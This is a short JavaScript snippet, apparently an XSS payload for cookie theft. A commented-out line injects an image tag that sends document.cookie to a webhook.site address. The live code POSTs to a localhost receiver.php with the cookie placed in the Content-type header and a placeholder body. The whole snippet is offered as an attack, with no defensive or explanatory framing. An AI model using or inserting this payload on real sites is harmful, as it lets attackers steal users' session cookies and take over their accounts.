

// document.write('<img src="https://webhook.site/e20b4d93-1463-463f-a58f-85ef7618f57c?c='+document.cookie+'" />');

fetch("http://localhost:8000/receiver.php", {
  method: "POST",
  body: JSON.stringify({
    userId: 1,
    title: "Fix my bugs",
    completed: false
  }),
  headers: {
    "Content-type": document.cookie
  }
});


